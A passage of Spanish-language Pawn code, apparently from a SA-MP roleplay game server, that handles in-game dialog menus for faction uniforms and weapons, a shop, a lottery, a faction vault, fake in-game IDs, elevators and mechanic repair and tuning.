						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
				}
			}
		}
		case DIALOGO_EQUIPO_LSPD3:
		{
		    if(response)
		    {
	    	    quitarArmas(playerid);
	        	PlayerPlaySound(playerid, 1052, 0.0, 0.0, 0.0);
	        	switch (listitem)
	        	{
		            case 0:
					{
						if(cuenta[playerid][cRango] < 2)return Mensaje(playerid, COLOR_GRIS2, "Rango insuficiente!");
						darArma(playerid, 23, 200);
						darArma(playerid, 43, 100);
						SetPlayerSkin(playerid, 166);
						SetHP(playerid, 100);
						format(string, sizeof(string), "* Detective %s se viste con su uniforme.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 1:
					{
				                if(cuenta[playerid][cRango] < 3)return Mensaje(playerid, COLOR_GRIS2, "Rango insuficiente!");
								darArma(playerid, 24, 200);
								SetPlayerSkin(playerid, 165);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* Guardaespaldas %s se viste con su uniforme.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 2:
					{
				                if(cuenta[playerid][cRango] < 4)return Mensaje(playerid, COLOR_GRIS2, "Rango insuficiente!");
								darArma(playerid, 23, 200);
								darArma(playerid, 34, 30);
								SetPlayerSkin(playerid, 164);
								darArmadura(playerid, 100);
								format(string, sizeof(string), "* Agente %s se viste con su uniforme.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 3:
					{
								SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
								format(string, sizeof(string), "* %s se viste con ropa normal.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
				}
			}
		}
		case DIALOGO_EQUIPO_LSPD4:
		{
		    if(response)
		    {
	    	    switch (listitem)
	        	{
	            	case 0:
					{
				                SetHP(playerid, 100);
								SetPlayerSkin(playerid, 70);
								format(string, sizeof(string), "* %s se pone su bata blanca y se desinfecta sus manos.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 1:
					{
				                SetHP(playerid, 100);
								SetPlayerSkin(playerid, 274);
								format(string, sizeof(string), "* %s se viste y guarda su radio.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 2:
					{
				                SetHP(playerid, 100);
								SetPlayerSkin(playerid, 275);
								format(string, sizeof(string), "* %s se viste y guarda su radio.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 3:
					{
				                SetHP(playerid, 100);
								SetPlayerSkin(playerid, 276);
								format(string, sizeof(string), "* %s se viste y guarda su radio.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 4:
					{
				                SetHP(playerid, 100);
								SetPlayerSkin(playerid, 277);
								darArma(playerid, 42, 250);
								darArma(playerid, 6, 1);
								format(string, sizeof(string), "* %s se viste y guarda su radio.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 5:
					{
				                SetHP(playerid, 100);
								SetPlayerSkin(playerid, 308);
								format(string, sizeof(string), "* %s se viste y guarda su radio.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 6:
					{
								if(booleano[OnDuty]{playerid}){	Mensaje(playerid, COLOR_GRIS2, "Estás en labor! Termina tu turno!"); return 1;    }
								SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
								format(string, sizeof(string), "* %s se viste con ropa normal", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
				}
			}
		}
		case DIALOGO_EQUIPO_LSPD5:
		{
		    if(response)
		    {
	    	    switch (listitem)
	        	{
	            	case 0:
					{
								SetPlayerSkin(playerid, 253);
								format(string, sizeof(string), "* %s se pone su traje de chófer.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 1:
					{
								SetPlayerSkin(playerid, 255);
								format(string, sizeof(string), "* %s se pone su traje de chófer.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 2:
					{
								SetPlayerSkin(playerid, 261);
								format(string, sizeof(string), "* %s se pone su traje de chófer.", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
					case 3:
					{
								SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
								format(string, sizeof(string), "* %s se viste con ropa normal", PlayerName(playerid));
								ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					}
				}
			}
		}
		case EQUIPO_MECANICO:
		{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
	            	case 0:
	            	{
		                SetPlayerSkin(playerid, 180);
		                darArma(playerid, 41, 1000);
	    	            format(string, sizeof(string), "* %s se viste con uniforme de ayudante.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	            	}
		            case 1:
		            {
		                SetPlayerSkin(playerid, 50);
	    	            darArma(playerid, 41, 1000);
	        	        format(string, sizeof(string), "* %s se viste con uniforme de mecanico.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	            	}
		            case 2:
		            {
	    	            SetPlayerSkin(playerid, 268);
	        	        darArma(playerid, 41, 1000);
	            	    format(string, sizeof(string), "* %s se viste con uniforme de ingeniero.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	            	}
	    	        case 3:
		            {
		                SetPlayerSkin(playerid, 185);
	        	        format(string, sizeof(string), "* %s se viste con su uniforme de director.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	            	}
		            case 4:
		            {
	    	            SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
	        	        format(string, sizeof(string), "* %s se viste con su ropa normal.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
	            	}
	     		}
		    }
		}
		case EQUIPO_GOBIERNO:
		{
		    if(response)
		    {
				switch(listitem)
				{
				    case 0:
			    	{
						SetPlayerSkin(playerid, 165);
						SetHP(playerid, 100);
						darArmadura(playerid, 100);
						darArma(playerid, 24, 150);
						format(string, sizeof(string), "* %s se viste con su uniforme de guardaespaldas.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			    	}
				    case 1:
				    {
				        quitarArmas(playerid);
	        	        SetPlayerSkin(playerid, cuenta[playerid][cTraje]);
	            	    format(string, sizeof(string), "* %s se viste su ropa normal.", PlayerName(playerid));
						ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			    	}
		        }
			}
		}
		case DIALOGO_COMPRAR_ROPA:
		{
			ShowModelSelectionMenu(playerid, skinb, "Selecciona el nuevo Skin");
			return 1;
		}
		case DIALOGO_COMPRA_247:
		{
			DesaparecerSelecion(playerid, 1);
			if(response)
			{
			    switch(listitem)
		    	{
	         		case 0:
			        {
			            if(verificarDinero(playerid, 5))
			            {
				            ShowPlayerDialog(playerid, LOTTO_BUY, DIALOG_STYLE_INPUT, "Lotería Nacional", "Inserta un número entre 1 y 150. Mucha Suerte!", "Comprar", "Cancelar");
			    	        return 1;
						}
			        }
			         case 1:
			        {
		    	        if(verificarDinero(playerid, 70))
		        	    {
	                        ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
				            darArma(playerid, 41, 500);
				            Mensaje(playerid, COLOR_BLANCO, "Has comprado un Spray.");
				            pierdeDinero(playerid, 70);
			    	        return 1;
						}
			        }
		         	case 2:
			        {
		    	        if(verificarDinero(playerid, 20))
		        	    {
			        	    ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			            	cuenta[playerid][cCigarrillos] = 20;
			            	Mensaje(playerid, COLOR_BLANCO, "Has una cajetilla con 20 cigarros, utilza \"/cfumar\"");
			            	pierdeDinero(playerid, 20);
			            	return 1;
						}
			        }
		         	case 3:
			        {
						if(verificarDinero(playerid, 20))
		    	        {
			    	        ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			        	    cuenta[playerid][cEncendedor] = 30;
			            	Mensaje(playerid, COLOR_BLANCO, "Compraste un encendedor.");
			            	pierdeDinero(playerid, 20);
			            	return 1;
						}
			        }
			        case 4:
			        {
						if(verificarDinero(playerid, 300))
		        	    {
			        	    ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			            	cuenta[playerid][cGafas] = 1;
			            	Mensaje(playerid, COLOR_BLANCO, "Compraste unas gafas, puedes utilizar: /gafas & /brillo");
			            	pierdeDinero(playerid, 300);
			            	return 1;
						}
		        	}
			        case 5:
			        {
						if(verificarDinero(playerid, 175))
		    	        {
			    	        ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			        	    cuenta[playerid][cMaleta] = 1;
			            	Mensaje(playerid, COLOR_BLANCO, "Compraste una maleta, puedes utilizar /maleta");
			            	pierdeDinero(playerid, 175);
			            	return 1;
						}
		        	}
			        case 6:
			        {
						if(verificarDinero(playerid, 75))
		    	        {
			    	        ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			        	    cuenta[playerid][cMochila] = 1;
			            	Mensaje(playerid, COLOR_BLANCO, "Compraste una mochila, utiliza /mochila");
			            	pierdeDinero(playerid, 75);
			            	return 1;
						}
		        	}
			        case 7:
			        {
						if(verificarDinero(playerid, 120))
		    	        {
			    	        ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			        	    cuenta[playerid][cCasco] = 1;
			            	Mensaje(playerid, COLOR_BLANCO, "Compraste un casco, utiliza /casco");
		            		pierdeDinero(playerid, 120);
			            	return 1;
						}
			        }
			        case 8:
			        {
						if(verificarDinero(playerid, 50))
		        	    {
			        	    ApplyAnimation(playerid, "DEALER", "shop_pay", 4.0, 0, 0, 0, 0, 0);
			            	Skate[playerid] = 1;
			            	Mensaje(playerid, COLOR_BLANCO, "Compraste unos patines, utiliza /patines");
			            	pierdeDinero(playerid, 50);
			            	return 1;
						}
					}
					case 9:
			        {
						if(verificarDinero(playerid, 35))
		        	    {
							booleano[TienePeriodico]{playerid} = true;
			            	Mensaje(playerid, COLOR_BLANCO, "Compraste un periodico, utiliza /periodico");
			            	pierdeDinero(playerid, 35);
			            	return 1;
						}
					}
				}
			}
		}
		case LOTTO_BUY:
		{
			if(response)
			{
				if(cuenta[playerid][cLoteria])return Mensaje(playerid, COLOR_ROJO, "Usted ya posee un billete de loteria!");
			    if(strval(inputtext) >= 1 && strval(inputtext) <= 150)
		    	{
					cuenta[playerid][cLoteria] = strval(inputtext);
					Mensaje(playerid, COLOR_BLANCO, "Lotería comprada!");
					pierdeDinero(playerid, 15);
				}
			}
		}
		case DIALOGO_BOVEDA:
		{
			if(response)
			{
				if(!cuenta[playerid][cLider])return Mensaje(playerid, COLOR_GRIS2, "No eres líder de facción.");
				new faccid = cuenta[playerid][cMiembro];
				switch(listitem)
				{
					case 0:
					{
						ShowPlayerDialog(playerid, DIALOGO_BOVEDA_SACAR, DIALOG_STYLE_INPUT, "Sacar Dinero", "{ffffff}Por favor escribir la cantidad de dinero que desea retirar.", "Aceptar", "Salir");
					}
					case 1 .. 20:
					{
						if(IFacciones[faccid - 16][If@armas][listitem - 1])
						{
							darArma(playerid, IFacciones[faccid - 16][If@armas][listitem - 1], 30);
							format(string, sizeof(string), "Usted acaba de retirar %s, con 30 balas.", GunNames[IFacciones[faccid - 16][If@armas][listitem - 1]]);
							Mensaje(playerid, COLOR_VERDE, string);
							IFacciones[faccid - 16][If@armas][listitem - 1] = 0;
						}
						else
						{
							Mensaje(playerid, COLOR_ROJO, "Este espacio esta vacio, para guardar armas usar /bguardar");
						}
					}
					case 21 .. 41:
					{
						switch(IFacciones[faccid - 16][If@drogas][listitem - 21])
						{
							case 1 .. 5:
							{
								if(IFacciones[faccid - 16][If@drogas][listitem - 21])
								{
									switch(IFacciones[faccid - 16][If@drogas][listitem - 21])
									{
										case 1: cuenta[playerid][cSpeed] += 30;
										case 2: cuenta[playerid][cExtasis] += 30;
										case 3: cuenta[playerid][cRitalin] += 30;
										case 4: cuenta[playerid][cHeroina] += 30;
										case 5: cuenta[playerid][cMarihuana] += 30;
									}
									format(string, sizeof(string), "Usted acaba de retirar 30 gramos de %s.", NombreDroga(IFacciones[faccid - 16][If@drogas][listitem - 17]));
									Mensaje(playerid, COLOR_VERDE, string);
									IFacciones[faccid - 16][If@drogas][listitem - 21] = 0;
								}
							}
							default:
							{
								Mensaje(playerid, COLOR_ROJO, "Este espacio esta vacio, para guardar drogas usar /bguardar.");
							}
						}
					}
				}
			}
		}
		case DNI_MENU:
		{
		    if(response)
		    {
		        if(strlen(inputtext) < 1 || strlen(inputtext) > 32 || strfind(inputtext, "_", true) != -1)
		        {
		            ShowPlayerDialog(playerid, DNI_MENU, DIALOG_STYLE_INPUT, "Traficante - DNI Falso", "Ingresa el nombre que quieres usar, Ejemplo: Jonathan Torres", "Aceptar", "Cancelar");
          		}
          		else{
          		    strmid(DNIName[playerid], inputtext, 0, strlen(inputtext), 32);
          			format(string, sizeof(string), "¿Estás seguro que quieres usar el nombre de\n\t%s en tu DNI falso?", DNIName[playerid]);
					ShowPlayerDialog(playerid, DNI_CONFIRM, DIALOG_STYLE_MSGBOX, "Traficante - DNI Falso", string, "Aceptar", "Cancelar");
				}
			}
  		}
		case DIALOGO_BOVEDA_SACAR:
		{
			if(response)
			{
				new idinero = strval(inputtext), faccid = cuenta[playerid][cMiembro];
				if(idinero < 1 || idinero > 5000)return Mensaje(playerid, COLOR_ROJO, "Solo puede sacar 5000$ por vez!");
				if(IFacciones[faccid - 16][If@boveda] >= strval(inputtext))
				{
					IFacciones[faccid - 16][If@boveda] -= strval(inputtext);
					ganaDinero(playerid, strval(inputtext));
					Mensaje(playerid, COLOR_VERDE, "Usted retiro dinero con exito.");
					return 1;
				}else Mensaje(playerid, COLOR_ROJO, "La boveda no dispone de esa cantidad de dinero!");
			}
			return 1;
		}
  		case DNI_CONFIRM:
  		{
  		    if(response)
  		    {
				strmid(cuenta[playerid][cIdentificacionName], DNIName[playerid], 0, strlen(DNIName[playerid]), 32);
				new dni = 100000 + random(899999);  cuenta[playerid][cIdentificacionFalse] = dni;
				format(string, sizeof(string), "* Has obtenido una identificación falsa, con el nombre de {41FF2F}%s.", cuenta[playerid][cIdentificacionName]);
				Mensaje(playerid, COLOR_BLANCO, string);
				pierdeDinero(playerid, 500);
  		    }
  		}
		case DIALOGO_PAQUETES_PREMIUM:
		{
			if(response)
			{
				if(cuenta[playerid][cZonaZeroCash] < premiums[listitem][vipCosto])return Mensaje(playerid, COLOR_ROJO, "Usted no tiene suficiente ZZCASH para comprar este beneficio.");
				cuenta[playerid][cZonaZeroCash] -= premiums[listitem][vipCosto];
				cuenta[playerid][cDonador] = premiums[listitem][vipNivel];
				cuenta[playerid][cDonar][0] = gettime() + premiums[listitem][vipTiempo];
				
				format(string, sizeof(string), "Felicidades, usted compro el beneficio %s por %s.", premiums[listitem][vipNombre], generarTiempo(cuenta[playerid][cDonar][0] - gettime()));
				Mensaje(playerid, COLOR_VERDE, string);
			}
			return 1;
		}
		case CREATE_WEAPON:
		{
		    if(response)
    	 	{
				MakeWeapon(playerid, packFAB[listitem][pf@requerido], packFAB[listitem][pf@item], packFAB[listitem][pf@unidades]);
			}
		}
		case DIALOG_LSPD_ELEVATOR:
		{
		    if(response)
		    {
				SetPlayerPos(playerid, 1526.5972, -1676.0651, 5.8906);
       			SetPlayerInterior(playerid, 0);
				cuenta[playerid][cInterior] = 0;
			}
			else
			{
			    LoadObjects(playerid);
				SetPlayerPos(playerid, 1575.1025, -1674.5824, 15.5611);
    			SetPlayerInterior(playerid, 0);
			}
		}
		case DIALOGO_FACCION_EDITAR:
		{
			if(response)
			{
				entero[playerid][opid2] = listitem;
				ShowPlayerDialog(playerid, DIALOGO_FACCION_EDITAR_A, DIALOG_STYLE_INPUT, "Edición", "Por favor ingrese el Nombre/Rango que desea.", "Aceptar", "Cancelar");
				return 1;
			}
		}
		case DIALOGO_FACCION_A:
		{
			if(response)
			{
				entero[playerid][opid2] = listitem;
				ShowPlayerDialog(playerid, DIALOGO_FACCION_B, DIALOG_STYLE_LIST, "Opciones", "Ascender\nDegradar\nExpulsar", "Aceptar", "Cancelar");
			}
			return 1;
		}
		case DIALOGO_FACCION_B:
		{
			if(response)
			{
				new i = entero[playerid][opid2], consulta[128];
				switch(listitem)
				{
					case 0:
					{
						entero[playerid][opid3][i]++;
						if(entero[playerid][opid3][i] >= 6) entero[playerid][opid3][i] = 6;
						mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "UPDATE zz_usuarios SET rango=%d WHERE id=%d", entero[playerid][opid3][i], entero[playerid][opid][i]);
						Mensaje(playerid, COLOR_VERDE, "Usted ascendio a este miembro exitosamente.");
					}
					case 1:
					{
						entero[playerid][opid3][i]--;
						if(entero[playerid][opid3][i] <= 0) entero[playerid][opid3][i] = 0;
						mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "UPDATE zz_usuarios SET rango=%d WHERE id=%d", entero[playerid][opid3][i], entero[playerid][opid][i]);
						Mensaje(playerid, COLOR_VERDE, "Usted degrado a este miembro exitosamente.");
					}
					case 2:
					{
						mysql_format(servidor[mysqlControl], consulta, sizeof(consulta), "UPDATE zz_usuarios SET lider=0, miembro=0, rango=0 WHERE id=%d", entero[playerid][opid][i]);
						Mensaje(playerid, COLOR_VERDE, "Usted expulso a este miembro exitosamente.");
					}
				}
				mysql_query(servidor[mysqlControl], consulta, false);
			}
			return 1;
		}
		case DIALOGO_FACCION_EDITAR_A:
		{
			if(response)
			{
				new i=cuenta[playerid][cMiembro], longitud=strlen(inputtext);
				switch(entero[playerid][opid2])
				{
					case 0: 
					{
						if(longitud < 10 || longitud > 32)return Mensaje(playerid, COLOR_ROJO, "Para el nombre de 10 a 32 caracteres.");
						format(IFacciones[i-16][If@nombre], 32, "%s", inputtext);
						format(string, sizeof(string), "{B22222}Territorio de\n{FFFFFF}%s", IFacciones[i-16][If@nombre]);
						UpdateDynamic3DTextLabelText(IFacciones[i-16][If@3dlabel], -1, string);
						Mensaje(playerid, COLOR_VERDE, "Usted modifico el nombre exitosamente.");
					}
					case 1:
					{
						if(longitud < 5 || longitud > 12)return Mensaje(playerid, COLOR_ROJO, "Para el rango de 5 a 12 caracteres.");
						format(IFacciones[i-16][If@rango0], 12, "%s", inputtext);
						Mensaje(playerid, COLOR_VERDE, "Usted modifico el rango exitosamente.");
					}
					case 2:
					{
						if(longitud < 5 || longitud > 12)return Mensaje(playerid, COLOR_ROJO, "Para el rango de 5 a 12 caracteres.");
						format(IFacciones[i-16][If@rango1], 12, "%s", inputtext);
						Mensaje(playerid, COLOR_VERDE, "Usted modifico el rango exitosamente.");
					}
					case 3:
					{
						if(longitud < 5 || longitud > 12)return Mensaje(playerid, COLOR_ROJO, "Para el rango de 5 a 12 caracteres.");
						format(IFacciones[i-16][If@rango2], 12, "%s", inputtext);
						Mensaje(playerid, COLOR_VERDE, "Usted modifico el rango exitosamente.");
					}
					case 4:
					{
						if(longitud < 5 || longitud > 12)return Mensaje(playerid, COLOR_ROJO, "Para el rango de 5 a 12 caracteres.");
						format(IFacciones[i-16][If@rango3], 12, "%s", inputtext);
						Mensaje(playerid, COLOR_VERDE, "Usted modifico el rango exitosamente.");
					}
					case 5:
					{
						if(longitud < 5 || longitud > 12)return Mensaje(playerid, COLOR_ROJO, "Para el rango de 5 a 12 caracteres.");
						format(IFacciones[i-16][If@rango4], 12, "%s", inputtext);
						Mensaje(playerid, COLOR_VERDE, "Usted modifico el rango exitosamente.");
					}
					case 6:
					{
						if(longitud < 5 || longitud > 12)return Mensaje(playerid, COLOR_ROJO, "Para el rango de 5 a 12 caracteres.");
						format(IFacciones[i-16][If@rango5], 12, "%s", inputtext);
						Mensaje(playerid, COLOR_VERDE, "Usted modifico el rango exitosamente.");
					}
				}
				return 1;
			}
		}
		case DIALOG_SAMUR_ELEVATOR:
		{
		    if(response == 1)
		    {
			  switch(listitem)
			  {
			   case 0:
			   {
				 SetPlayerPos(playerid, 1144.5675, -1329.4045, 13.5906);
                 LoadObjects(playerid);
				 SetPlayerInterior(playerid, 0);
				 cuenta[playerid][cInterior] = 0;
			   }
			   case 1:
			   {
				 SetPlayerPos(playerid, 1161.3854, -1330.1027, 31.4942 );
				 LoadObjects(playerid);
				 SetPlayerInterior(playerid, 0);
			   }
		     }
		}
		else
		{

		}
    }
		case DIALOG_FBI_ELEVATOR:
		{
		    if(response)
		    {
	    	    switch(listitem)
	        	{
		            case 0:
					{
        	            if(IsPlayerInRangeOfPoint(playerid, 5.0, 1241.6906,-1781.8174,33.6510))
            	        {
							SetPosEx(playerid, 208.0704, 142.1360, 1003.0234, 0, 3, 0);
						}
						else 
						{
						    LoadObjects(playerid);
						    SetPosEx(playerid, 1241.6906,-1781.8174,33.6510, 0, 0, 0);
	    				}
					}
				}
			}
		}
		case MECANICO_MENU:
		{
			if(response)
		    {
	    	    switch(listitem)
	        	{
					case 0:
					{
				        if(!IsAtTaller(playerid))return Mensaje(playerid, COLOR_AMARILLO, "No estás en el taller!");
	    				if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
						ShowPlayerDialog(playerid, MECANICO_MENU_REPARACION, DIALOG_STYLE_LIST, "-> Reparaciones <-", "{FFFFFF}» Reparar Motor\n» Reparar Motor + Carrocería", "Reparar", "Atrás");
						return 1;
					}
					case 1:
					{
					    if(!IsAtTaller(playerid))return Mensaje(playerid, COLOR_AMARILLO, "No estás en el taller!");
					    if(IsPlayerInAnyVehicle(playerid))
				    	{
							format(string, sizeof(string), "* %s llena el depósito del vehículo.", PlayerName(playerid));
			      			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
					  		Gas[idcar] = 1000;
					  		return 1;
						}
						else return Mensaje(playerid, COLOR_AMARILLO, "No estás en un vehículo!");
					}
					case 2:
					{
        	            if(!IsAtTaller(playerid))return Mensaje(playerid, COLOR_AMARILLO, "No estás en el taller!");
	    				if(!IsPlayerInAnyVehicle(playerid))return Mensaje(playerid, COLOR_GRIS2, "No estás en un vehículo!");
						ShowPlayerDialog(playerid, MECANICO_MENU_TUNING, DIALOG_STYLE_LIST, "-> Tunear <-", "{FFFFFF}» Tuning General\n» Tuning Específico\n» Cambiar Color\n» Cambiar Nombre Vehículo\n» Cambiar Motor\n» Baterías", "Aceptar", "Atrás");
						return 1;
					}
					case 3:
					{
					    Remolcar(playerid);
					}
					case 4:
					{
					    ShowPlayerDialog(playerid, MECANICO_MENU_OTROS, DIALOG_STYLE_LIST, "-> Otros <-", "{FFFFFF}» Matricular Vehículo\n» Examinar Vehículo\n» Instalar alarma", "Aceptar", "Atrás");
						return 1;
		}
					case 5:
					{
						if( !IsAtTaller( playerid ) )return Mensaje( playerid, COLOR_AMARILLO, "No estás en el taller!" );
						if( !IsPlayerInAnyVehicle( playerid ) )return Mensaje( playerid, COLOR_AMARILLO, "No estas montado en ningun vehiculo." );

						if(cuenta[playerid][cRango]>1){//Cr34=>
							ChangeVehicleColor(idcar, 0, 0);
							if(autos[idcar][cWheel]>0) RemoveVehicleComponent(idcar, autos[idcar][cWheel]);
							if(autos[idcar][cHydraulics]>0) RemoveVehicleComponent(idcar, autos[idcar][cHydraulics]);
							if(autos[idcar][cNitro]>0) RemoveVehicleComponent(idcar, autos[idcar][cNitro]);
							if(autos[idcar][cSideskirt]>0)
							{
								RemoveVehicleComponent(idcar, autos[idcar][cSideskirt]);
								new skirt=autos[idcar][cSideskirt];
								//X-FLOW
								if(skirt==1030)RemoveVehicleComponent(idcar, 1031);
								else if(skirt==1039)RemoveVehicleComponent(idcar, 1041);
								else if(skirt==1048)RemoveVehicleComponent(idcar, 1052);
								else if(skirt==1070)RemoveVehicleComponent(idcar, 1072);
								else if(skirt==1057)RemoveVehicleComponent(idcar, 1063);
								else if(skirt==1093)RemoveVehicleComponent(idcar, 1095);
								//ALIEN
								if(skirt==1026)RemoveVehicleComponent(idcar, 1027);
								else if(skirt==1036)RemoveVehicleComponent(idcar, 1040);
								else if(skirt==1047)RemoveVehicleComponent(idcar, 1051);
								else if(skirt==1069)RemoveVehicleComponent(idcar, 1071);
								else if(skirt==1056)RemoveVehicleComponent(idcar, 1062);
								else if(skirt==1094)RemoveVehicleComponent(idcar, 1090);
							}
							if(autos[idcar][cRoof]>0) RemoveVehicleComponent(idcar, autos[idcar][cRoof]);
							if(autos[idcar][cSpoiler]>0) RemoveVehicleComponent(idcar, autos[idcar][cSpoiler]);
							if(autos[idcar][cRearBumper]>0) RemoveVehicleComponent(idcar, autos[idcar][cRearBumper]);
							if(autos[idcar][cFrontBumper]>0) RemoveVehicleComponent(idcar, autos[idcar][cFrontBumper]);
							if(autos[idcar][cExhaust]>0) RemoveVehicleComponent(idcar, autos[idcar][cExhaust]);
							if(autos[idcar][cPaintjob]>0) ChangeVehiclePaintjob(idcar, 0);
							ShowPlayerDialog( playerid, MECANICO_MENU_CHECK_REMOVEALL, DIALOG_STYLE_MSGBOX, "Restaurar valores del vehiculo a fabrica", "¿Estas seguro de que quieres hacer este cambio? (haras perder al cliente todo el tuneo del vehiculo)", "Si", "No" );
						}else return Mensaje( playerid, COLOR_AMARILLO, "Debes ser al menos rank 2 en tu facción para poder usar esta función." );
					}
				}
			}
		}

		case LSPD_EMBARGOS_MENU:
		{
			if(response)
		    {
	    	    switch(listitem)
	        	{
					case 0:
					{
				    	ShowPlayerDialog(playerid, MECANICO_MENU_EMBARGAR, DIALOG_STYLE_LIST, "-> Embargar <-", "{FFFFFF}» Incrementar +1 Embargo\n» Decrementar -1 Embargo\n» Multar vehículo\n» Desembargar vehículo", "Aceptar", "Atrás");
						return 1;
					}
				}
			}
		}

  case MECANICO_MENU_CHECK_REMOVEALL:
  {
			if(response)
			{
				autos[idcar][cColorOne] = 0;
				autos[idcar][cColorTwo] = 0;
				autos[idcar][cWheel] = 0;
				autos[idcar][cHydraulics] = 0;
				autos[idcar][cNitro] = 0;
				autos[idcar][cSideskirt] = 0;
				autos[idcar][cRoof] = 0;
				autos[idcar][cSpoiler] = 0;
				autos[idcar][cRearBumper] = 0;
				autos[idcar][cFrontBumper] = 0;
				autos[idcar][cExhaust] = 0;
				autos[idcar][cPaintjob] = 0;
				Mensaje( playerid, COLOR_BLANCO, "Vehiculo devuelto a valores de fabrica!" );
			} else {
				AddCarTuning(idcar);
				Mensaje(playerid, COLOR_GRIS2, "Vehiculo devuelto al estado anterior." );
				return 1;
			}
		}
		case MECANICO_MENU_REPARACION:
		{
			if(response)
		    {
        	 	GetVehiclePos(idcar, cx, cy, cz);
         		PlayerPlaySound(playerid, 1133, cx, cy, cz);
	        	switch(listitem)
	        	{
		            case 0: {
					format(string, sizeof(string), "* %s arregla el motor del vehículo.", PlayerName(playerid));
      				ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
		  			SetVehicleHealth(idcar, 1000.0);
					return 1; }
					case 1: {
					format(string, sizeof(string), "* %s coloca una carrocería nueva al vehículo y cambia el motor dañado.", PlayerName(playerid));
    	  			ProxDetector(30.0, playerid, string, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA, COLOR_PURPURA);
			  		RepairVehicle(idcar);
					return 1; }
				}
			}
		}
